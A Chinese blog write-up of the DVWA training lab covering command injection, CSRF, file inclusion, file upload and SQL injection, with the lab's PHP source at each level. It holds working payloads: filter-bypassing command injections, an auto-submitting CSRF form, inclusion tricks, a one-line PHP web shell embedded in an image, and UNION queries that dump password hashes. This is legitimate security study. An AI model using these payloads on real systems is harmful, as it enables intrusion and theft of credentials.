---
title: dvwa靶场学习记录
description: dvwa靶场学习记录
cover: false
tags:
  - CTF-Web
  - 安全
categories:
  - CTF
  - Web安全
typora-root-url: ..
abbrlink: 96b78edd
date: 2022-10-02 21:48:58
---



# <span id="Command_Inj">Command_Injection命令注入</span>

## Low

这里让输入一个IP地址, 提交之后会ping这个地址, 并返回结果<img src="/images/ctf-web-dvwa/image-20221005210912925.png" alt="image-20221005210912925" style="zoom:67%;" />

这里直接把ping之后的回显返回了, 那么推测这里输入IP地址后, 会拼接成`ping xxx` 的形式, 并在shell中执行这个命令, 那么是否可以执行其他命令呢

```
127.0.0.1 && whoami
```

<img src="/images/ctf-web-dvwa/image-20221005210957625.png" alt="image-20221005210957625" style="zoom:67%;" />

发现`whoami`也被成功执行了

```shell
127.0.0.1 && dir //查看下当前目录
```

<img src="/images/ctf-web-dvwa/image-20221005211050908.png" alt="image-20221005211050908" style="zoom:67%;" />

打印当前目录下的某个文件内容:

```
127.0.0.1 && more index.php
```

<img src="/images/ctf-web-dvwa/image-20221005211127934.png" alt="image-20221005211127934" style="zoom:67%;" />

源码:

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];
    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // 这里检测是否为windows系统,对不同的系统构造不同的ping命令
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?> 
```

` php_uname`会返回运行php的系统的有关信息,这里`php_uname( 's' )`返回了操作系统的名称

<br>

## Medium

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );
    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?> 
```

这里过滤了`&&`和分号

在win的命令行中: 

| "\|" : 管道符将前面命令的执行结果作为后面命令的输入,且只返回后一个命令的结果 |
| ------------------------------------------------------------ |
| "\|\|" 或, 如果前面命令成功执行了, 那么后面的命令就不再执行了 |
| "&&":且, 前面的命令成功执行后, 才会执行后面的命令            |
| "&":同时执行多条命令, 不论成功与否                           |

```
127.0.0.1 & whoami
127.0.0.1 | whoami 
127.0.0.1 &;& whoami # 这里过滤了分号,"&;&"也就变成了"&&"
```

以上的`whoami`命令都能够被成功执行

<br>

## High

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);
    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }
    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?> 
```

这里设置了范围更大的黑名单,跟上一题相比多过滤了好多字符,但是注意到这里只是过滤了 "| ",而没有过滤不带空格,或者空格在前的 "|", " |"

```
127.0.0.1 |whoami
127.0.0.1|whoami
```

<br>

## impossible

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target ); //删除字符串中的反斜杠

    // Split the IP into 4 octects
    $octet = explode( ".", $target ); //通过"."将用户输入的IP分割成四个数字,并在后面分别进行检测

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }
        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}
// Generate Anti-CSRF token
generateSessionToken();
?> 
```

使用类似白名单的过滤方式







<br>

***

<br>



# CSRF跨站请求伪造

>跨站请求伪造:Cross-site request forgery
>
>攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取且尚未过期的注册凭证(Cookie等)，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。
>
>示例(来自维基百科):
>
>假如一家銀行用以執行轉帳操作的URL地址如下：
>
> `https://bank.example.com/withdraw?account=AccoutName&amount=1000&for=PayeeName`
>
>那麼，一個惡意攻擊者可以在另一个網站上放置如下代碼：
>
> `<img src="https://bank.example.com/withdraw?account=Alice&amount=1000&for=Badman" />`
>
>如果有賬戶名為Alice的用戶訪問了惡意站點，而她之前剛訪問過銀行不久，**登錄信息尚未過期**(也就是说此时他打开银行的网站是不需要再次登录的)，那么他就会转账100元给Badman这个账户



## 常见的攻击类型

- GET类型CSRF:

  正如上面的示例, 攻击者希望执行的操作就包含在URL中. 攻击者引诱用户**B**（在网站**A**拥有尚未过期的身份验证信息）点击这个链接, 发出HTTP请求的同时就已经以用户**B**的身份在网站**A**执行了攻击者定义的操作．

- POST类型CSRF：

  例如利用一个访问页面就会**自动提交**的**隐藏**表单： 携带某网站登录凭证的用户只要访问恶意页面,此表单就会自动提交

  ```html
   <form action="http://bank.example/withdraw" method=POST>
      <input type="hidden" name="account" value="michael" />
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="for" value="hacker" />
  </form>
  <script> document.forms[0].submit(); </script>
  ```

  <br>

  

## Low

<img src="/images/ctf-web-dvwa/image-20221002222941894.png" alt="image-20221002222941894" style="zoom:67%;" />

一个修改密码的页面,随便提交一个密码,可以看到提交的内容就包含在了URL里面:

```
http://127.0.0.1:8090/dvwa/vulnerabilities/csrf/?password_new=12345&password_conf=12345&Change=Change#
```

(另外,这里真的会修改dvwa的登录密码,之前做到这里之后dvwa就登录不上了,我还为此搜了好久解决方法.....😅)

所以这里想攻击其实随便把上面这个url用短链接,图片链接等方式隐藏,然后引诱受害者点击就好了

另外, Burpsuite中也有构造CSRF攻击的功能:

<img src="/images/ctf-web-dvwa/image-20221002223410095.png" alt="image-20221002223410095" style="zoom: 50%;" />

这里其实就是帮我们构造了一个HTML页面, 以**提交隐藏表单的方式**进行POST类型的CSRF攻击

<img src="/images/ctf-web-dvwa/image-20221002223638249.png" alt="image-20221002223638249" style="zoom: 50%;" />

浏览器访问这个链接之后,不知情的用户点击了下面的按钮就会执行修改密码为"12345"的操作

<img src="/images/ctf-web-dvwa/image-20221002223709927.png" alt="image-20221002223709927" style="zoom:67%;" />

看源码: 没有任何防护措施

```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Get input
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Do the passwords match?  检测新密码和确认密码是否匹配
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new ); //将新密码转为md5值存储

		// Update the database 构造更新数据库的语句,将新密码存储进数据库
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
		$html .= "<pre>Passwords did not match.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```



<br>

## Medium

使用Low中的方法修改密码会提示请求错误

<img src="/images/ctf-web-dvwa/image-20221002224442021.png" alt="image-20221002224442021" style="zoom:67%;" />



```php
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Checks to see where the request came from
	if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
		// Get input
		$pass_new  = $_GET[ 'password_new' ];
		$pass_conf = $_GET[ 'password_conf' ];

		// Do the passwords match?
		if( $pass_new == $pass_conf ) {
			// They do!
			$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
			$pass_new = md5( $pass_new );

			// Update the database
			$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

			// Feedback for the user
			$html .= "<pre>Password Changed.</pre>";
		}
		else {
			// Issue with passwords matching
			$html .= "<pre>Passwords did not match.</pre>";
		}
	}
	else {
		// Didn't come from a trusted source
		$html .= "<pre>That request didn't look correct.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

从代码中可以看到:第5行执行了一个检测: 检测`$_SERVER[ 'HTTP_REFERER' ]`字段中是否会出现`$_SERVER[ 'SERVER_NAME' ]`

>`$_SERVER[ 'HTTP_REFERER' ]`: **请求头中的Referer字段,用来告知服务器网页是从哪个页面链接过来的,因此,如果是直接输入url访问某个网页, 请求头中没有这个字段. 同时,检测这个字段的内容也能有效防止外部链接.**
>
>`SERVER_NAME`:也就是要访问的主机名,请求头中的`Host`字段

<img src="/images/ctf-web-dvwa/image-20221002225154848.png" alt="image-20221002225154848" style="zoom:67%;" />

如果通过`burpsuite`构造的攻击页面来访问,请求头是这样的: 也就无法通过检测

<img src="/images/ctf-web-dvwa/image-20221002225854005.png" alt="image-20221002225854005" style="zoom:67%;" />

这样攻击起来也就很简单了:

- 1.从burpsuite的repeater中,将请求头改为需要的格式就能成功修改密码:

<img src="/images/ctf-web-dvwa/image-20221002230256055.png" alt="image-20221002230256055" style="zoom:67%;" />

- 2.将burpsuite构造的用于攻击的html代码保存为html文件,并命名为`127.0.0.1abc.html`:(如果是实战中,这里127.0.0.1改为实际网站的主机名就行了)

  <img src="/images/ctf-web-dvwa/image-20221002230712493.png" alt="image-20221002230712493" style="zoom:67%;" />

这样当通过这个页面来提交修改密码时,`Referer`字段就会包含检测所需的主机名,从而成功修改密码

<br>

***

<br>

# <span id="File_Inc">File_Inclusion文件包含</span>

>文件包含主要包括本地文件包含和远程文件包含。当服务器在其PHP配置中开启`allow_url_include`选项的时候，就可以通过PHP的包含函数（**类似python的import**）`include(),require(),require_once(),include_once()`利用url去动态包含文件，此时**如果没有对文件来源进行检查**，就容易导致任意文件读取和任意命令执行。
>
>另外, 服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，**如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容**. 

<br>

## Low

<img src="/images/ctf-web-dvwa/image-20221005202407211.png" alt="image-20221005202407211" style="zoom:67%;" />

<img src="/images/ctf-web-dvwa/image-20221005202504846.png" alt="image-20221005202504846" style="zoom:67%;" />

代码非常简单:  用户点击三个文件的链接, 就通过GET的方式去传文件名参数并打开对应的文件,如果是php文件则会执行, 是其他文件则会输出文件内容. 

```php
<?php
// The page we wish to display
$file = $_GET[ 'page' ];
?> 

```

那么只要修改URL中的参数就可以实现命令执行和文件读取了

<img src="/images/ctf-web-dvwa/image-20221005203401000.png" alt="image-20221005203401000" style="zoom:67%;" />

![image-20221005203601530](/images/ctf-web-dvwa/image-20221005203601530.png)

另外, 被包含的文件就算不是php格式,只要其中的内容被识别为php代码,那么仍然可以执行:

<img src="/images/ctf-web-dvwa/image-20221005204018216.png" alt="image-20221005204018216" style="zoom:67%;" />

另外,还可以包含远程文件:

```
?page=http://192.168.110.147/test.txt
```

**还可以通过php伪协议来实现命令执行等操作:**

```
http://127.0.0.1:8090/dvwa/vulnerabilities/fi/?page=data:text/plain,%20%3C?php%20phpinfo();?%3E
```

![image-20221005210347812](/images/ctf-web-dvwa/image-20221005210347812.png)



<br>

## Medium

相比于Low,多了一些过滤

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file ); //方式包含远程文件
$file = str_replace( array( "../", "..\"" ), "", $file );
?> 
```

这种简单的替换过滤其实就和没有一样..

- 双写绕过: 

```
?page=hthttp://tp://127.0.0.1:8090/xxxxx.txt
str_replace函数过滤掉一个"http://"之后,就变成了:
?page=http://127.0.0.1:8090/xxxxx.txt
```

<img src="/images/ctf-web-dvwa/image-20221005204816678.png" alt="image-20221005204816678" style="zoom:67%;" />

- 使用绝对路径来包含文件也不受影响

<br>

## High

```php
 <?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
?>
```

使用了`fnmatch(要检索的模式,被检索的字符串)` 函数来检测字符串是否满足某种格式, 这里必须是 "file*"的模式, 也就是file1,file2等

那么这里正好可以使用`file://`协议来读取文件

```
http://127.0.0.1:8090/dvwa/vulnerabilities/fi/?page=file:///c:\\Windows\win.ini
```

但是file://协议不能执行命令, 需要配合文件上传

<br>

## Impossible

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

使用精确的白名单进行过滤, 断绝了钻空子的可能..

<br>

***

<br>

# File_Upload文件上传

>攻击者通过上传可执行的木马脚本等，从而获取服务器端可执行命令的权限，文件上传漏洞通常是对用户上传的文件类型没有进行严格的过滤检查。
>
>利用文件上传漏洞必须满足：**1.文件能够成功被上传；2.上传文件的路径可知；3.上传的文件可以被执行**

## Low

<img src="/images/ctf-web-dvwa/image-20221010214513667.png" alt="image-20221010214513667" style="zoom:67%;" />

没有任何过滤的文件上传，任何类型的文件都可以被上传，而且还会告知上传路径

那么可以上传一个一句话木马，并使用中国菜刀来连接：

```php
<?php eval(@$_POST['a']); ?>
```

中国菜刀中，地址栏填写上传后一句话木马的路径，软件会自动访问我们填写的地址，并给`c`变量post

值。以小马传大马，从而成功获得网站的shell

<img src="/images/ctf-web-dvwa/image-20221010221841914.png" alt="image-20221010221841914" style="zoom:67%;" />

成功获取shell，并读取了网站目录

<img src="/images/ctf-web-dvwa/image-20221010222029634.png" alt="image-20221010222029634" style="zoom:67%;" />

另外，也可以通过POST的方式访问这个木马来执行任意命令：

<img src="/images/ctf-web-dvwa/image-20221010222552161.png" alt="image-20221010222552161" style="zoom:67%;" />

最后简单看一看源码： 这里没有加任何过滤措施

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );//此函数返回路径中的文件名部分
    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
?> 
```



<br>

## Medium

这里直接传php格式的一句话木马文件会被拒绝，抓包对比一下传`php`文件和传符合要求的`jpeg`文件时的区别：

<img src="/images/ctf-web-dvwa/image-20221010230632068.png" alt="image-20221010230632068" style="zoom:67%;" />



<img src="/images/ctf-web-dvwa/image-20221010230546287.png" alt="image-20221010230546287" style="zoom:67%;" />

发现文件类型主要体现在 `Content-Type`字段中，那么传php文件时，在`burpsuite`中将这个字段的值修改为`image/jpeg`就能绕过检测成功上传一句话木马了。

后面的操作就和Low中的一样了。

看一下代码：这里限制了文件类型必须是`jpeg`或`png`

```php
<?php
if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {
        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
?> 
```

<br>

## High



```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) { //此函数检测文件是否是图片，并会返回图像的相关信息，例如高度，宽度等。如果不是图片，则会返回false。所以这里必须上传真的图片才可以
        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
?> 
```

对于文件后缀名的检测，当`php<5.3.4`时，可以利用`%00`来截断文件名

例如将一句话木马文件命名为,这样既可以通过后缀名检测，服务器还能将其作为php文件来执行

```
shell.php%00.jpg
```

这里通过还`getimagesize`函数来检测上传的对象是否真的是图片

制作图片木马：`a.png`是一个正常的图片文件，`one_sentence.php`是一句话木马文件，通过`copy`命令将后者追加到前者里，新生成的文件时`shell.png`

```shell
copy a.png/b+one_sentence.php shell.png
```

<img src="/images/ctf-web-dvwa/image-20221011000457423.png" alt="image-20221011000457423" style="zoom:67%;" />

此文件能够被正常上传

然后使用菜刀就可以获得shell了

<img src="/images/ctf-web-dvwa/image-20221011000901098.png" alt="image-20221011000901098" style="zoom:67%;" />



- **另外，还可以借助[文件包含](#File_Inc)漏洞，使用`file://`伪协议来执行该图片文件里包含的php代码**

```
?page=file:///fE:\\phpstudy\phpstudy_proa\WWW\dvwa\hackable\uploads\shell.png
```

<img src="/images/ctf-web-dvwa/image-20221011193621361.png" alt="image-20221011193621361" style="zoom:67%;" />



还可以借助[命令注入](#Command_Inj)漏洞,执行`copy`将上传的图片马转为php格式，从而能够直接执行

```
127.0.0.1|copy ..\..\hackable\uploads\shell.png ..\..\hackable\uploads\shell.php 
```

<img src="/images/ctf-web-dvwa/image-20221011194817432.png" alt="image-20221011194817432" style="zoom:67%;" />

## Impossible

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    // File information获取上传文件的信息
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
    // Where are we going to be writing to?上传文件的存储位置
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/';
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) );
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext;
    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &&
        ( $uploaded_size < 100000 ) &&
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) &&
        getimagesize( $uploaded_tmp ) ) {
        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
        //下面的代码对图片文件进行重新编码，从而抹除图片的元数据，由此图片马也失效
        if( $uploaded_type == 'image/jpeg' ) {
            $img = imagecreatefromjpeg( $uploaded_tmp );//此函数返回一个jpeg图片的对象
            imagejpeg( $img, $temp_file, 100);//从图片对象img创建一个图片对象，第二个参数是文件名，第三个参数是图片质量，范围0-100
            //这里重新创建了图片，也就实现了对图片的重新编码
        }
        else {
            $img = imagecreatefrompng( $uploaded_tmp );
            imagepng( $img, $temp_file, 9);
        }
        imagedestroy( $img );

        // Can we move the file to the web root from the temp folder?
        //重命名文件，第15行计算了文件md5值并以此对文件进行了重命名，导致%00截断等手段失效
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
            // Yes!
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>";
        }
        else {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        // Delete any temp files
        if( file_exists( $temp_file ) )
            unlink( $temp_file );
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}
// Generate Anti-CSRF token
generateSessionToken();
?> 
```













# SQL注入

这个就不用多解释了,感觉很多SQL注入漏洞都属于逻辑漏洞..

![image-20221003155130854](/images/ctf-web-dvwa/image-20221003155130854.png)

## Low

代码:

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];
    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
    mysqli_close($GLOBALS["___mysqli_ston"]);
}
?> 
```

可以看到第六行是直接将用户输入的内容拼接进入sql查询语句的



最简单的测试:  成功地查到了所有用户的信息

```
1' or '1'='1
实际执行的查询语句:
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1';
```

<img src="/images/ctf-web-dvwa/image-20221003155219962.png" alt="image-20221003155219962" style="zoom:67%;" />



接下来进一步挖掘数据库的结构:

查询数据库版本和数据库名:

```
1' and '1'='2' union select version(),database() #
实际执行的查询语句:
SELECT first_name, last_name FROM users WHERE user_id ='1' and '1'='2' union select version(),database() #';
同样的,还可以使用user()来查询用户名等
```

![image-20221003160005175](/images/ctf-web-dvwa/image-20221003160005175.png)

从数据库自带的`information_schema.TABLES`表中查询数据库`dvwa`中的所有表的表名:

```
1' and '1'='2' union select group_concat(TABLE_NAME),2 from information_schema.TABLES where table_schema='dvwa'#
实际执行的查询语句:
SELECT first_name, last_name FROM users WHERE user_id ='1' and '1'='2' union select group_concat(TABLE_NAME),2 from information_schema.TABLES where table_schema='dvwa'#
```

这里执行时会报错: 这里是`UNION`联合查询的表之间字符集不统一造成的

```
Illegal mix of collations for operation 'UNION'
```

解决:

进入`dvwa`目录中的`mysql.php`:

<img src="/images/ctf-web-dvwa/image-20221003171702035.png" alt="image-20221003171702035" style="zoom:67%;" />

28行改为这样

<img src="/images/ctf-web-dvwa/image-20221003171739783.png" alt="image-20221003171739783" style="zoom:67%;" />

也就是在`$create_db`的赋值语句后面加上

```
COLLATE utf8_general_ci;
完整的语句为:$create_db = "CREATE DATABASE {$_DVWA[ 'db_database' ]} COLLATE utf8_general_ci;";
```

然后打开`dvwa`网页,在setup页面重新创建数据库即可.

<br>

继续刚才的注入: 上一步的操作查询到了名为`dvwa`的数据库中所有表的名字, 分别是`guestbook`和`users`

![image-20221003171955497](/images/ctf-web-dvwa/image-20221003171955497.png)

`users`表可能存储了用户的登录信息,所以接下来继续挖掘`user`表的信息:

```
1' and '1'='2' union select group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where table_schema='dvwa' and table_name='users'#
实际执行的语句:
SELECT first_name, last_name FROM users WHERE user_id ='1' and '1'='2' union select group_concat(COLUMN_NAME),2 from information_schema.COLUMNS where table_schema='dvwa' and table_name='users'#
```

<img src="/images/ctf-web-dvwa/image-20221003172329006.png" alt="image-20221003172329006" style="zoom:67%;" />

那么现在想查询用户的登录密码: (存储在数据库中的是密码的md5值)

```
1' and '1'='2' union select user,password from users#
```

<img src="/images/ctf-web-dvwa/image-20221003172555074.png" alt="image-20221003172555074" style="zoom:67%;" />



另外,也可以使用`sqlmap`来检测

```
py sqlmap.py -u "http://127.0.0.1:8090/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=gvgndipck63rc8pjddt2ocmna4"
```

<img src="/images/ctf-web-dvwa/image-20221003180018715.png" alt="image-20221003180018715" style="zoom:67%;" />

<br>

## Medium

代码:

```php
<?php
if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];
mysqli_close($GLOBALS["___mysqli_ston"]);
?> 
```

注意到第5行,接收来自POST的参数后,使用`mysqli_real_escape_string`对SQL 语句中使用的字符串中的特殊字符进行转义.可以用来防止一部分的数据库攻击, 受影响的字符包括: 

```
\x00 \n \r \ ' " \x1a
```

因此这里无法再使用单引号对语句进行闭合了

同时改成了通过POST的方式来传参,对用户属于进行控制:

<img src="/images/ctf-web-dvwa/image-20221004112736936.png" alt="image-20221004112736936" style="zoom:67%;" />

那么使用burpsuite来抓包:

<img src="/images/ctf-web-dvwa/image-20221004112812655.png" alt="image-20221004112812655" style="zoom:67%;" />

那么使用burpsuite的`Repeater`功能就可以进行注入了, Low中使用的payload都可以继续使用,只是需要去除单引号等会被转义的符号

